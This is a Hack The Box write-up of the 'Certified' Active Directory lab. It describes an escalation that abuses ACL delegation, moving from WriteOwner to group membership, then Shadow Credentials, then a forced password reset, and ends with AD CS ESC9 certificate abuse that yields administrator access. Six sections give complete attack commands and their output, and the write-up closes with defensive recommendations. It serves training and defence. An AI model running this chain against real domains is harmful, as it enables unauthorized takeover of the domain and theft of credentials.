---
title: "Certified — Active Directory ACL Delegation and AD CS ESC9 Escalation"
description: "Group and account-control permissions form an ACL chain ending in AD CS ESC9 certificate abuse."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
objective: "Escalate from provided low-privilege credentials through an ACL delegation chain to administrative domain-controller access."
tools:
  - rustscan
  - nmap
  - rusthound-ce
  - impacket-owneredit
  - impacket-dacledit
  - bloodyAD
  - pywhisker
  - gettgtpkinit
  - getnthash
  - Certipy
  - evil-winrm
skill: "Active Directory ACL abuse and AD CS certificate escalation"
outcome: "Administrative domain-controller execution via an ESC9-issued Administrator certificate"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Active Directory domain controller |
| Starting position | Provided low-privilege domain credentials |
| Objective | Escalate from provided low-privilege credentials through an ACL delegation chain to administrative domain-controller access |
| Outcome | Administrative domain-controller execution via an ESC9-issued Administrator certificate |

## ACL delegation chain and ESC9 escalation

Certified is a Medium Hack The Box Active Directory lab that starts from provided low-privilege domain credentials. Directory relationship data exposes a chain of delegated permissions across a management group, a service account, and a certificate-operator account; abusing AD CS ESC9 closes the chain and yields an Administrator certificate. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/). A small number of transitions appear as command only, with no captured output, so I could not verify their results.

**Attack path:** **WriteOwner on `Management` → group membership → `GenericWrite` Shadow Credentials on the service account → `GenericAll` over the certificate-operator account → forced password reset → AD CS ESC9 UPN manipulation → Administrator certificate**

## Domain controller, provided account, and no foothold

Certified runs Active Directory on a Windows domain controller. The lab begins from a single provided low-privilege account and requires no initial foothold; Kerberos, LDAP, SMB, and WinRM are exposed. LDAP-backed directory collection produced the relationship graph used to plan the escalation. The objective was to move from the provided account to administrative control of the domain controller by following the permitted relationships rather than exploiting a remote-code-execution flaw.

All activity stayed inside the Hack The Box lab environment, and the provided credentials were the only starting point.

## Evidence: WriteOwner to ESC9 Administrator certificate

### 1. Enumerate domain services and the ACL path

Observation: a service scan exposed a domain controller (Kerberos, LDAP, SMB, and WinRM), and directory collection with the provided account surfaced a chain of delegated access.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
rusthound-ce -u '<LAB_USER>' -p '<LAB_PASSWORD>' \
  --domain <DOMAIN> -c All -z -o certified
```

Truncated scan output:

```text
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          <DOMAIN>
445/tcp  open  microsoft-ds
636/tcp  open  ssl/ldap
3268/tcp open  ldap
5985/tcp open  http          WinRM
```

I checked the collected directory data, which revealed this ACL path:

```text
<LAB_USER>
  -> WriteOwner on Management
  -> add self to Management
  -> Management has GenericWrite on <SERVICE_ACCOUNT>
  -> Shadow Credentials to <SERVICE_ACCOUNT>
  -> <SERVICE_ACCOUNT> has GenericAll over <CA_OPERATOR>
  -> reset <CA_OPERATOR> password
  -> <CA_OPERATOR> can enroll in an ESC9 template
  -> Administrator certificate
```

Significance: LDAP, SMB, and WinRM provide the directory paths needed for the later ACL and certificate operations, and the delegated permissions form a contiguous route from the starting account to a certificate authority.

Result: the scan and directory collection identify the exposed services and the delegated-permission chain, which together define the escalation plan.

### 2. Take ownership of `Management`

Observation: `<LAB_USER>` holds `WriteOwner` on the `Management` group, so the account can rewrite the object's owner.

```bash
impacket-owneredit -dc-ip <TARGET_IP> -action write \
  -new-owner '<LAB_USER>' -target-sid '<MANAGEMENT_SID>' \
  '<DOMAIN>/<LAB_USER>:<LAB_PASSWORD>'
```

Output:

```text
[*] OwnerSid modified successfully!
```

Significance: controlling an object's owner allows rewriting its DACL, so ownership leads to effective rights.

Result: `<LAB_USER>` becomes owner of `Management`.

### 3. Rewrite the group DACL and join `Management`

Observation: as owner, the account can modify the group DACL to grant membership-write, after which it can add itself to the group.

```bash
impacket-dacledit -action write -rights WriteMembers \
  -principal '<LAB_USER>' -target-dn '<MANAGEMENT_DN>' \
  '<DOMAIN>/<LAB_USER>:<LAB_PASSWORD>'

bloodyAD --host <TARGET_IP> -d <DOMAIN> \
  -u '<LAB_USER>' -p '<LAB_PASSWORD>' \
  add groupMember 'Management' '<LAB_USER>'
```

Significance: the group carries `GenericWrite` over `<SERVICE_ACCOUNT>`, so membership converts a low-privilege account into control over that service account.

Result: `<LAB_USER>` is added to `Management`, which the next stage depends on.

### 4. Shadow Credentials over the service account

Observation: `Management` has `GenericWrite` over `<SERVICE_ACCOUNT>`, enough to add a key credential and authenticate through PKINIT.

```bash
python3 pywhisker.py -d <DOMAIN> -u '<LAB_USER>' \
  -p '<LAB_PASSWORD>' --target '<SERVICE_ACCOUNT>' --action add
```

Output:

```text
[+] Saved PFX (#PKCS12) certificate & key at path: <PFX_FILE>
[*] Must be used with password: <PFX_PASSWORD>
```

Request a TGT with the key credential and recover the account NT hash:

```bash
python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<PFX_PASSWORD>' \
  <DOMAIN>/<SERVICE_ACCOUNT> <CCACHE_FILE>
export KRB5CCNAME=<CCACHE_FILE>
python3 getnthash.py -key '<AS_REP_KEY>' <DOMAIN>/<SERVICE_ACCOUNT>
```

Output:

```text
Recovered NT Hash
```

Significance: Shadow Credentials convert write access into Kerberos authentication material without changing the account's password, and `getnthash` exposes the account NT hash for pass-the-hash.

Result: a key credential and the NT hash for `<SERVICE_ACCOUNT>` are recovered and subsequently validated through WinRM (`evil-winrm -i <DC_HOST> -u '<SERVICE_ACCOUNT>' -H '<SERVICE_ACCOUNT_HASH>'`) as `<SERVICE_ACCOUNT>`.

### 5. Reset the operator account and identify ESC9

Observation: `<SERVICE_ACCOUNT>` holds `GenericAll` over `<CA_OPERATOR>`, which allows a password reset; the operator can then enumerate the certificate authority.

```bash
bloodyAD --host <TARGET_IP> -d <DOMAIN> \
  -u '<SERVICE_ACCOUNT>' -p ':<SERVICE_ACCOUNT_HASH>' \
  set password '<CA_OPERATOR>' '<NEW_OPERATOR_PASSWORD>'
```

Output:

```text
[+] Password changed successfully!
```

Enumerate vulnerable templates with the operator account:

```bash
certipy-ad find -vulnerable -u '<CA_OPERATOR>' \
  -p '<NEW_OPERATOR_PASSWORD>' -dc-ip <TARGET_IP>
```

Output:

```text
Template Name : <VULNERABLE_TEMPLATE>
Vulnerability : ESC9 - Template has no security extension
CA Name       : <CA_NAME>
```

Significance: `GenericAll` allows a reset that grants full control of the operator account, and that account can enroll in a template missing the security extension, which is the ESC9 condition.

Result: the reset changes the operator password and the enumeration identifies a template vulnerable to ESC9.

### 6. ESC9 enrollment and administrative authentication

Observation: with the operator's credentials and its UPN pointed at the administrative identity, the vulnerable template can issue a certificate that authenticates as `<ADMIN_ACCOUNT>`.

Set the operator UPN:

```bash
certipy-ad account update -username '<SERVICE_ACCOUNT>@<DOMAIN>' \
  -hashes '<SERVICE_ACCOUNT_HASH>' -user <CA_OPERATOR> \
  -upn <ADMIN_ACCOUNT>
```

Request a certificate from the ESC9 template:

```bash
certipy-ad req -username '<CA_OPERATOR>@<DOMAIN>' \
  -p '<NEW_OPERATOR_PASSWORD>' -dc-ip <TARGET_IP> \
  -ca '<CA_NAME>' -template '<VULNERABLE_TEMPLATE>'
```

Output:

```text
[*] Wrote certificate and private key to '<ADMIN_PFX>'
```

Restore the original UPN:

```bash
certipy-ad account update -username '<SERVICE_ACCOUNT>@<DOMAIN>' \
  -hashes '<SERVICE_ACCOUNT_HASH>' -user <CA_OPERATOR> \
  -upn '<CA_OPERATOR>@<DOMAIN>'
```

Authenticate with the issued certificate:

```bash
certipy-ad auth -pfx '<ADMIN_PFX>' -domain <DOMAIN> -dc-ip <TARGET_IP>
```

Output:

```text
Got hash for '<ADMIN_ACCOUNT>@<DOMAIN>'
```

Access WinRM as the administrative identity:

```bash
evil-winrm -i <DC_HOST> -u '<ADMIN_ACCOUNT>' -H '<ADMIN_HASH>'
```

Output:

```text
<DOMAIN>\<ADMIN_ACCOUNT>
```

Significance: ESC9 lets a certificate requested under the altered UPN be trusted as `<ADMIN_ACCOUNT>`, so the template produces administrative authentication material without any knowledge of the administrator password. Restoring the UPN limits the change left on the account.

Result: certificate authentication returns `<ADMIN_ACCOUNT>` material, and WinRM confirms execution as `<DOMAIN>\<ADMIN_ACCOUNT>`.

## The UPN swap needed for ESC9 enrollment

- ESC9 enrollment requires the enrolling account to resolve to the target identity at request time. The operator account's UPN was set to `<ADMIN_ACCOUNT>` for the certificate request and restored to `<CA_OPERATOR>@<DOMAIN>` immediately afterward; the restore is part of the recorded chain, not a remediation.

## Outcome: ESC9 certificate and administrative execution

The certificate issued through the vulnerable template provides administrative execution on the domain controller as `<DOMAIN>\<ADMIN_ACCOUNT>`, rather than through the administrator password.

## Recommendations: ownership, GenericWrite, GenericAll, and the ESC9 template

The recommendations below were not validated according to the source.

1. **Excessive ownership and DACL delegation on privileged groups.** `<LAB_USER>` held `WriteOwner` over `Management`, so the account could take ownership and rewrite the group DACL. *Recommendation:* reduce `WriteOwner`/`WriteMembers` delegation on privileged groups and monitor owner and DACL changes.
2. **`GenericWrite` over a service account.** `Management` had `GenericWrite` over `<SERVICE_ACCOUNT>`, which a key credential turned into Kerberos authentication material and the account NT hash. *Recommendation:* restrict `GenericWrite` on service accounts and monitor key-credential (`msDS-KeyCredentialLink`) writes for unexpected entries.
3. **`GenericAll` over the certificate-operator account.** `<SERVICE_ACCOUNT>` had `GenericAll` over `<CA_OPERATOR>`, which allowed an unauthorized password reset. *Recommendation:* apply least privilege to CA operator and service-account permissions and monitor privileged password resets.
4. **ESC9-vulnerable template with a mutable UPN.** `<VULNERABLE_TEMPLATE>` lacked the certificate security extension, and the enrolling account's UPN could be changed, so a certificate authenticated as `<ADMIN_ACCOUNT>`. *Recommendation:* configure templates with the security extension, enforce strong certificate binding, and audit UPN changes and certificate issuance for accounts that can enroll.

## References

- [Hack The Box — Certified](https://app.hackthebox.com/machines/Certified) (retired machine)
- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and certificate abuse)
- [KB5014754 — Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/help/5014754) (strong certificate binding)
- [\[MS-CRTD\]: msPKI-Enrollment-Flag Attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1) (certificate-template security extension flag)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
